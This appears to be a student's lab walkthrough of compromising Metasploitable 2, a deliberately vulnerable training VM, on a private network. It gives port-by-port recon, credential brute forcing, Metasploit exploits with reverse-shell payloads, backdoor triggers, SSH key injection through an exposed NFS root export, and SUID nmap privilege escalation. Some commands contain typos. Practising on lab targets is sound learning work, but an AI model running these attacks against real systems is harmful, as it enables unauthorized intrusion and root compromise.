# Target Master Log: Metasploitable 2
**Date Started:** 2026-06-28
**Target IP:** '192.168.56.101/24'
**Attacker IP:** '192.168.56.102/24'

---

## 1. Master Reconnaissance
### Complete TCP Scan Command
```bash
sudo nmap -sS -T3 192.168.56.101
```
### Attack Surface Checklist
- [x] **Port 21**  |   `ftp`
- [x] **Port 22**  |   `ssh`
- [x] **Port 23**  |   `telnet`
- [x] **Port 25**  |   `smtp`
- [ ] **Port 53**  |    `domain`
- [x] **Port 80**  |     `http`
- [x] **Port 111** |   `rpcbind`
- [x] **Port 139** |    `netbios-ssn`
- [x] **Port 445** |    `microsoft-ds`
- [x] **Port 512** |    `exec`
- [x] **Port 513** |    `login`
- [x] **Port 514** |    `shell`
- [ ] **Port 1099** |    `rmiregistry`
- [x] **Port 1524** |    `ingreslock`
- [x] **Port 2049** |    `nfs`
- [x] **Port 2121** |    `ccproxy-ftp`
- [x] **Port 3306** |    `mysql`
- [x] **Port 5432** |    `postgresql`
- [x] **Port 5900** |    `vnc`
- [ ] **Port 6000** |    `X11`
- [x] **Port 6667** |    `irc`
- [ ] **Port 8009** |    `ajp13`
- [ ] **Port 8180** |    `unknown`

---

## 2. Active Exploitation Log
### Port 21 - ftp
* **Target Software/Version:** vsftpd 2.3.4
* **Exploit/Tools Attempted:** Metasploit, Manual technique
* **Status:** Root Shell

**Commands Run:**
```bash
ftp 192.168.56.101
```
user: test:)
password: [Anything]

```bash
nc 192.168.56.101 6200
```
(immediately in a new terminal. this gives a root prompt)

**Key Discovery/ Output Notes:**
When you gain root using the "manual technique" it immediately gives you the prompt in a blank line after running the nc command so don't think it is a buffer!!

### Port 22 - ssh
* **Target Software/Version:** OpenSSH 4.7p1 Debian 8ubuntu1(protocol 2.0)
* **Exploit/Tools Attempted:** Metasploit, hydra
* **Status:** Root Shell

**Commands Run:**
   **1. Using hydra:**
   ```bash
   hydra -L /home/kali/USERS/users.txt -P /home/kali/PASS/passwords.txt 192.168.56.101 ssh -t 4
   ```
   **2. Using Metasploit:**
   ```bash
   msfconsole
   use auxiliary/scanner/ssh/ssh_login
   set RHOST 192.168.56.101
   set RPORT 22
   set USER_FILE /home/kali/USERS/users.txt
   set PASS_FILE /home/kali/PASS/passwords.txt
   run
   ```
After getting the machines's correct credentials:
     
```bash
     ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.56.101
```
     
   **Key Discovery/Output:**
   Using hydra to crack the credentials was not a success because of old cryptographic algorithms disabled by modern kali linux.
   The metsploit tries all the combinations from the list of users and passwords until it gets a matching pair rendering the process successful..
   The ssh algorithm used in the machine is too old that's why we add it to our "key list".

### Port 23 - telnet
* **Target Software/Version:** Linux telnetd
* **Exploit/Tools Attempted:** Metasploit
* **Status:** Root Shell

**Commands Run:**
   **Using Metasploit:**
   ```bash
   msfconsole
   use auxiliary/scanner/telnet/telnet_login
   set RHOST 192.168.56.101
   set RPORT 23
   set USER_FILE /home/kali/USERS/users.txt
   set PASS_FILE /home/kali/PASS/passwords.txt
   run
   ```
After getting the machines's correct credentials:
     
```bash
     telnet 192.168.56.101
```
then use the credentials to login.

**Key Discovery/Output:**
 The metasploit tries all the combinations from the list of users and passwords until it gets a matching pair rendering the process successful.

### Port 25 - smtp
* **Target Software/Version:** Postfix smtpd
* **Exploit/Tools Attempted:** Metasploit
* **Status:**

 **Commands Run:**
 ```bash
 msfconsole
 use auxiliary/scaner/smtp/smtp_enum
 set RHOSTS 192.168.56.101
 run
 ```
 **Key Discovery/Output:**
 This is not really an exploitable service like other ports but it is useful to get the usernames of all users in the machine. Cuts work in half, like you can create a list of usernames and then use such a file in a bruteforce attack for the passwords like how we did with ssh or telnet.

### Port 80 - http
* **Version:** Apache httpd 2.2.8(Ubuntu) DAV/2)
* **Exploit/Tools Attempted:** Metasploit
* **Status:** Root Shell

**Commands Run:**
```bash
msfconsole
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set TARGETURI /phpMyAdmin/
set PAYLOAD php/meterpreter/reverse_tcp
exploit
```
**Key Discovery/Output:**
When using this exact exploit, it gives you a meterpreter shell.
to get a bash shell run: shell
This gives you a foothold of the target under the user 'www-data'. This is low privileged user so you need to escalate your permissions. 
To do so you need to find an exploitable vector which will give you a root shell. I found a nmap SUID binary file and ran this commands:
```bash
usr/bin/nmap --interactive
!sh
```

### Ports 111/2049 - rpcbind and nfs
* **Target Software/Version:** NFSv2, NFSv3
* **Service:** NFS(Network File System) via RPC Portmapper
* **Exploit/Tools Attempted:** Manual technique
*  **Status:** Still prompted for password

**Commands run:**
```bash
# Identify rpc services
rpcinfo -p 192.168.56.101
# List available NFS shares
showmount -e 192.168.56.101 | grep nfs
# Mount the target's root filesystem
sudo mount -t nfs -o nolock,vers=3 192.168.56.101:/ /mnt
# Inject SSH public key into target's authorized keys
cat ~/.ssh/hack_rsa.pub | sudo tee /mnt/root/.ssh/authorized_keys
# Set permissions
sudo chmod 600 /mnt/root/.ssh/authorized_keys
sudo chown -R 0:0 /mnt/root/.ssh
# Unmount the target's root filesystem
sudo umount /mnt
# Attempt login
ssh -i ~/.ssh/hack_rsa -o HostKeyAlgorithms=+ssh-rsa root@192.168.56.101
```
**Key Discovery/Output:**
'Export list for 192.168.56.101:   /*' . This is a goldmine in the sense that it means The target is exporting its entire root filesystem to anyone with no restrictions.

So i mounted it locally and injected an SSH public key into '/root/.ssh/authorized_keys'.
SSH key authentication is brutally unforgiving about permissions - it checks not just the .ssh folder and authorized_keys file, but every parent directory in the path. Even though my key was correctly placed with 600 permissions on the file and 700 on .ssh, SSH still ignored it.
     **Debugging Attempts:**
     *  Verified sshd_config ->  PubKeyAuthentication: yes, PermitRootLogin: yes
     * Verified authorized_keys exist ad contains the key
     * Verified permissions(600 on file, 700 on .ssh)


### Ports 139/445 - Samba
**Service:** Samba (SMB/CIFS file sharing)
**Version:** 3.0.20-Debian
**Ports:** 139/TCP (NetBIOS Session), 445/TCP(SMB over TCP)
**Exploit/Tools Attempted:** Metasploit
**Status:** Root shell

**Commands Run:**
```bash
# Version check for te samba service
nmap -sV -p139,445 192.168.56.101
```
```bash
msfconsole
searchsploit samba | grep 3.0.20-Debian
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.102
set LPORT 4444
exploit
```
**Key Discovery/Output:**
The nmap scan confirms that the Samba version is  exact 3.0.20-Debian. This version is vulnerable to the CVE-2007-2447 -- Username Map Script Command Injection. The 'usermap_script' vulnerability allows remote injection via the username field during SMB authentication. This is a pre-authentication exploit -- meaning you don't need a valid username or password to trigger it

### Ports 512/513/514 - Rlogin
**Service:** Rlogin
**Service Version:** Standard (Metasploitable 2 default)
**Ports Version:** 512/tcp netkit-rsh rexecd, 513/tcp OpenBSD, 514/tcp netkit-rshd
**Exploit/Tools Attempted:** Manual Technique
**Status:** Root Shell

**Commands run:**
```bash
# Rlogin version check
nmap -sV -p512,513,514 192.168.56.101
# Rlogin
rlogin -l root 192.168.56.101
```
**Key Discovery/Output:**
The target trusts connections from itself (and sometimes other specific IPs)
Rlogin provides an interactive shell access without authentication when coming from a trusted host, Metasploitable trusts itself.

### Port 1524 - Ingreslock
**Service:** Ingreslock(Database lock manager backdoor)
**Version:** Ingres Database
**Exploit/Tools Attempted:** Manual Technique
**Status:** Root Shell

**Commands Run:**
```bash
# Ingreslock Version Check
nmap -sV -p1524 192.168.56.101
# Exploitation
nc -vn 192.168.56.101 1524
```
**Key Discovery/Output:** 
The service is listening for connections and spawning a shell when you connect.
It's essentially a "backdoor" left intentionally by the developers.
The shell runs as root because the service started as root.

### Port 2121 - ccproxy-ftp
**Service:** ProFTPD
**Version:** ProFTPD 1.3.1
**Exploit/Tools Attempted:** Metasploit
**Status::** Root Shell

**Commands Run:**
```bash
# Version Check for service
nmap -sV -p2121 192.168.56.101
```
```bash
msfconsole
use exploit/unix/ftp/proftpd_mod_copy
set RHOSTS 192.168.56.101
set RPORT 2121
set SITEPATH /var/www/html # Web root on metasploitable 2
set TARGETURI /shell.php # Where to upload the shell
set PAYLOAD /php/meterpreter/reverse_tcp
set LHOST 192.168.56.102
set LPORT 4444
exploit
```
This gives you a meterpreter shell, run shell to get a BASH shell, then escalate root via SUID nmap

**Key Discovery/Output:**
I was really having a hard time getting a hang of this port, especially the manual exploitation technique(also had some VM issues). So i reverted to using metasploit to carry out the exploit.
I did some reading and found out that this version of ProFTPD has a moduke called 'mod_copy' that allows authenticated (or unauthenticated, depending on config) users to copy files on the server using SITE CPFR and SITE CPTO commands. Since you can log in as anonymous or ftp, you can copy a PHP shell into the web root and gain RCE.

### Port 3306 - MySQL
**Service:** MySQL
**Version:** 5.0.51a
**Exploit/Tools Attempted:** Metasploit
**Status:** Root Shell

**Commands Run:**
```bash
# service version check
nmap -sV -p3306 192.168.56.101
# Exploitation
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.56.101
set RPORT 3306
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set STOP_ON_SUCCESS true
run
```
This gives you a root:root username and password combination.
```bash
msfconsole
use exploit/linux/mysql/mysql_payload
set RHOSTS 192.168.56.101
set USERNAME root
set PASSWWORD root
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.102
set LPORT 4444
exploit
```
**Key Discovery/Output:**
Shell as the user running MySQL (on Metasploitable 2, it runs as root).
Escalate to root via SUID nmap if needed.


### Port 5432 - Postgresql
**Service:** Postgresql
**Version:** Postgresql 8.3.9
**Exploit/Tools Attempted:** Metasploit
**Status:** Root Shell

**Commands Run:**
```bash
nmap -sV -p5432 192.168.56.101 # Version
# Exploitation
msfconsole
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.56.101
set USERNAME postgres
set PASSWORD postgres
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.102
exploit
```
**Key Discovery/Output:**
Shell as the user running postgres (on Metasploitable 2, it runs as root).
Escalate to root via SUID nmap if needed.

### Port 5900 - vnc
**Service:** VNC (Virtual Network Computing - graphical desktop)
**Version:** TightVNC
**Exploit/Tools Attempted:** Metasploit(For password), Manual technique(Gaining foothold)
**Status:** Root Shell

**Command Run:**
```bash
msfconsole
use auxiliary/scanner/vnc/vnc_login
set RHOST 192.168.56.101
set USERNAME root
run
```
After getting the password:
```bash
vncviewer 192.168.56.101
```
**Key Discovery/Output:**
VNC often ships with weak or default passwords.
If you can access the desktop, you can run GUI tools or upload files.
VNC runs as the user who started it - metasploitable, that's root.

### Port 6667 - irc
**Service:** UnrealIRCd (Internet Relay Chat daemon)
**Version:** UnrealIRCd 3.2.8.1
**Exploit/Tools Attempted:** Metasploit
**Status:** Root Shell

**Commands Run:**
```bash
nmap -sV -p6667 192.168.56.101 # Version check
```
```bash
e
# exploitation
msfconsole
search unreal_ircd_3281_backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.102
set LPORT 4444
exploit
```
**Key Discoveries/Output:**
They backdoor was intentionally planted in the DEBUG_DOLOG_SYSTEM macro, which contains malicious code that can be triggered remotely.
You'll get a shell as the user running the IRC service. You'll need to escalate privileges afterward, but this gives you a solid foothold.
i tried the manual technique on this port but i kept failing to send the backdoor trigger in time, like i kept being late to sending it.

### Port 8009/8180 - tomcat
**Service:** Apache Tomcat
**Version:** Apache Tomcat 5.5
**Exploit/Tools Attempted:** Metasploit
**Status:** Root Shell

**Commands Run:**
```bash
nmap -sV -p8009,8180 192.168.56.101 # Version Check
# Exploitation
msfconsole
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.56.101
set RPORT 8180
set USERNAME tomcat
set PASSWORD tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.56.102
set LPORT 4444
exploit
```
**Key Discovery/Output:**
tomcat:tomcat is the default credential for tomcat service.
Tomcat manager allows deploying web apps. A malicious WAR = remote code execution. 
Tomcat user runs with low privileges therefore you can use the nmap SUID binary to escalate privileges.
I am still trying to understand the manual way of doing this so when i really get a hang of it i'll update this walkthrough!!





